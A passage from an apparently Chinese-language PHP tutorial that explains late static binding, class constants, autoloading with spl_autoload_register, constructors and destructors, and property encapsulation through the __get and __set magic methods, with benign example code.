src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121100906.png" /></p>
<p>可以看到，使用 <code>new static()</code> 创建的实例属于
<code>Demo2</code> 类，分析一下：</p>
<ul>
<li><code>$obj6 = (new Demo2)-&gt;get_static();</code>
：<code>Demo2</code> 的实例调用了 <code>get_static()</code>
方法，但该类并没有方法，所以就去调用父类中的该方法，从而创建了一个新的实例
<code>$obj6</code>，但生成的实例 <code>$obj6</code>
并不属于父类，而是属于当前类；</li>
<li><code>$obj5 = (new Demo2)-&gt;get_obj();</code>
：过程一样，也是父类调用了 <code>get_obj()</code>
方法，但这里是由父类创建的实例
<code>$obj5</code>，生成的实例属于父类；</li>
<li>这就是两者的区别，<code>static</code>
与调用者绑定，不论调用的实例中的方法属于谁，都只与调用者绑定，而
<code>self()</code>
与当前类绑定，不论调用者是谁，在哪个类中调用该方法，返回的就是对应的类的实例；</li>
</ul>
<h1 id="类常量的创建于访问">4. 类常量的创建于访问</h1>
<p>类常量：</p>
<ul>
<li>类常量的值在类中始终不变；</li>
<li>用 <code>const</code> 关键字创建；</li>
<li>不用加 <code>$</code> ；</li>
<li>必须初始化；</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> name = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> domain = &lt;&lt;&lt; <span class="string">&#x27;EOT&#x27;</span></span><br><span class="line">    &lt;a href=<span class="string">&quot;&quot;</span>&gt;www.baidu.com&lt;/a&gt;</span><br><span class="line">    EOT;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_domain</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::domain;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;1. 类名::类常量名：&#x27;</span>.Demo::name.<span class="string">&#x27;, &#x27;</span>.Demo::domain.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$class_name</span> = <span class="string">&#x27;Demo&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;2. 类变量::类常量名：&#x27;</span>.<span class="variable">$class_name</span>::name.<span class="string">&#x27;, &#x27;</span>.<span class="variable">$class_name</span>::domain.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;3. 对象（实例）::类常量名：&#x27;</span>.(<span class="keyword">new</span> Demo)::name.<span class="string">&#x27;, &#x27;</span>.(<span class="keyword">new</span> Demo)::domain.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;4. 对象（实例）-&gt;方法：&#x27;</span>.(<span class="keyword">new</span> Demo)-&gt;get_name().<span class="string">&#x27;, &#x27;</span>.(<span class="keyword">new</span> Demo)-&gt;get_domain().<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>访问类常量：</p>
<ol type="1">
<li>在类中：使用 <code>self::类常量名</code>；</li>
<li>在类外，上述四种；</li>
</ol>
<h1 id="自动加载类">5. 自动加载类</h1>
<p>很多时候，会对每一个类创建一个 php
文件，这样做最大的烦恼就是在文件的开头需要导入太多的文件。</p>
<p>比如，先创建一个 <code>test.php</code> 文件实现一个类 ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test&#123;</span><br><span class="line">    public $name;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&#x27;百度&#x27;)&#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以使用 <code>require</code> 或 <code>include</code> 两种方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// require(&#x27;test.php&#x27;);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;test.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> Test(<span class="string">&#x27;Google&#x27;</span>))-&gt;name;</span><br></pre></td></tr></table></figure>
<p>方法 2：使用
<code>__autoload()</code>，当我们引用一个不存在的类时，自动调用它导入该类文件，条件，类名和类文件名相同（不看后缀）,
并且在同一个目录下。</p>
<blockquote>
<p><code>__autoload()</code> 在 PHP8.0.0 中被移除。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test&#123;</span><br><span class="line">    public $name;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&#x27;百度&#x27;)&#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class_name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$class_name</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="variable">$path</span>))&#123;</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$path</span>.<span class="string">&#x27;不存在，请检查~~&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> Test(<span class="string">&#x27;Google&#x27;</span>))-&gt;name;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121104225.png" /></p>
<p>方法 3：自定义导入函数 <code>spl_autoload_register()</code>
将自定义的类导入函数添加到函数栈中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test&#123;</span><br><span class="line">    public $name;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&#x27;百度&#x27;)&#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loader</span>(<span class="params"><span class="variable">$class_name</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="variable">$class_name</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="variable">$path</span>))&#123;</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$path</span>.<span class="string">&#x27;不存在，请检查~~&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spl_autoload_register(<span class="string">&#x27;loader&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> Test(<span class="string">&#x27;Google&#x27;</span>))-&gt;name;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121104523.png" /></p>
<p>除了可以把自定义函数导入之外，还可以将类中的函数导入，使用方式
<code>spl_autoload_register['类名'/实例名, '方法名']</code>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Loader</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">loader</span>(<span class="params"><span class="variable">$class_name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="variable">$class_name</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$path</span>))&#123;</span><br><span class="line">            <span class="keyword">require_once</span>(<span class="variable">$path</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$path</span>.<span class="string">&#x27;不存在，请检查~~&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">spl_autoload_register([(<span class="keyword">new</span> Loader),<span class="string">&#x27;loader&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> Test(<span class="string">&#x27;Google&#x27;</span>))-&gt;name;</span><br></pre></td></tr></table></figure>
<p>一般使用方式如下，使用 <code>static</code> ：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Loader</span></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">loader</span>(<span class="params"><span class="variable">$class_name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="variable">$class_name</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$path</span>))&#123;</span><br><span class="line">            <span class="keyword">require_once</span>(<span class="variable">$path</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$path</span>.<span class="string">&#x27;不存在，请检查~~&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> loader();</span><br><span class="line"></span><br><span class="line">spl_autoload_register([<span class="string">&#x27;Loader&#x27;</span>,<span class="string">&#x27;loader&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> Test(<span class="string">&#x27;Google&#x27;</span>))-&gt;name;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个时候直接写类名即可，把类名放在字符串中。</p>
<h1 id="类中的构造方法与析构方法">6. 类中的构造方法与析构方法</h1>
<blockquote>
<p>魔术方法一般都是 <code>public</code>。</p>
</blockquote>
<h2 id="构造方法">6.1. 构造方法</h2>
<p><code>__construct()</code>
：实例化时自动调用，通常用来初始化对象中的属性。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$salary</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$salary</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Staff(<span class="string">&#x27;Takagi&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;10k&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>.<span class="variable">$obj</span>-&gt;name.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;年龄：&#x27;</span>.<span class="variable">$obj</span>-&gt;age.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;薪水：&#x27;</span>.<span class="variable">$obj</span>-&gt;salary.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121105555.png" /></p>
<h2 id="析构方法">6.2. 析构方法</h2>
<p><code>__destruct()</code> ：对象销毁时自动调用，没有参数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$salary</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$salary</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;当前对象被销毁。&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Staff(<span class="string">&#x27;Takagi&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;10k&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>.<span class="variable">$obj</span>-&gt;name.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;年龄：&#x27;</span>.<span class="variable">$obj</span>-&gt;age.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;薪水：&#x27;</span>.<span class="variable">$obj</span>-&gt;salary.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="comment"># unset($obj); # 销毁对象</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121105837.png" /></p>
<p>可以使用 <code>unset</code>
手动销毁对象。当整个文件执行结束后，也会自动销毁。</p>
<h1 id="对象的封装">7. 对象的封装</h1>
<p>对象的封装：主要指对象属性的封装，通过 <code>private</code>
访问控制符。</p>
<p>还是以 [[#6. 类中的构造方法与析构方法]]
中的类为例子，将属性的访问控制符改为 <code>private</code> ：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$salary</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_age</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_salary</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;salary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">modified</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Staff(<span class="string">&#x27;Takagi&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;10k&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>.<span class="variable">$obj</span>-&gt;get_name().<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;年龄：&#x27;</span>.<span class="variable">$obj</span>-&gt;get_age().<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;薪水：&#x27;</span>.<span class="variable">$obj</span>-&gt;get_salary().<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj</span>-&gt;modified(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;m1ku&#x27;</span>);</span><br><span class="line"><span class="variable">$obj</span>-&gt;modified(<span class="string">&#x27;age&#x27;</span>, <span class="number">20</span>);</span><br><span class="line"><span class="variable">$obj</span>-&gt;modified(<span class="string">&#x27;salary&#x27;</span>, <span class="string">&#x27;3k&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>.<span class="variable">$obj</span>-&gt;get_name().<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;年龄：&#x27;</span>.<span class="variable">$obj</span>-&gt;get_age().<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;薪水：&#x27;</span>.<span class="variable">$obj</span>-&gt;get_salary().<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这样子，只能通过类中提供的接口（方法）来访问类的私有属性，修改也是一样的，只能通过类中提供的接口来修改私有属性。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121110715.png" /></p>
<p>这样是比较麻烦得，因此 PHP
提供了两个魔术方法：<code>__get($name)</code> 和
<code>__set($name, $val)</code> ：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$salary</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Staff(<span class="string">&#x27;Takagi&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;10k&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>.<span class="variable">$obj</span>-&gt;name.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;年龄：&#x27;</span>.<span class="variable">$obj</span>-&gt;age.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;薪水：&#x27;</span>.<span class="variable">$obj</span>-&gt;salary.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj</span>-&gt;name = <span class="string">&#x27;m1ku&#x27;</span>;</span><br><span class="line"><span class="variable">$obj</span>-&gt;age = <span class="number">30</span>;</span><br><span class="line"><span class="variable">$obj</span>-&gt;salary = <span class="string">&#x27;3k&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>.<span class="variable">$obj</span>-&gt;name.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;年龄：&#x27;</span>.<span class="variable">$obj</span>-&gt;age.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;薪水：&#x27;</span>.<span class="variable">$obj</span>-&gt;salary.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121111209.png" /></p>
<p>使用这两个魔术方法，就可以把 <code>private</code> 当做
<code>public</code>
属性一样去访问、修改，如果需要规定哪些属性不能被修改或不能返回，可以这样：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$salary</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> == <span class="string">&#x27;salary&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> == <span class="string">&#x27;age&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Staff(<span class="string">&#x27;Takagi&#x27;</span>, <span class="number">18</span>, <span class="string">&#x27;10k&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>.<span class="variable">$obj</span>-&gt;name.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;年龄：&#x27;</span>.<span class="variable">$obj</span>-&gt;age.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;薪水：&#x27;</span>.<span class="variable">$obj</span>-&gt;salary.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj</span>-&gt;name = <span class="string">&#x27;m1ku&#x27;</span>;</span><br><span class="line"><span class="variable">$obj</span>-&gt;age = <span class="number">30</span>;</span><br><span class="line"><span class="variable">$obj</span>-&gt;salary = <span class="string">&#x27;3k&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;姓名：&#x27;</span>.<span class="variable">$obj</span>-&gt;name.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;年龄：&#x27;</span>.<span class="variable">$obj</span>-&gt;age.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;薪水：&#x27;</span>.<span class="variable">$obj</span>-&gt;salary.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221121111401.png" /></p>
<p>可以看到，年龄无法修改，并且薪水无法显示。</p>
<p>还有两个魔术方法：</p>
<ul>
<li><code>__isset(属性名)</code>
：外部检测某私有属性是否存在时自动调用；</li>
<li><code>__unset(属性名)</code>
：在外部销毁某个私有属性时自动调用；</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Staff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$salary</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;salary = <span class="variable">$salary</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span 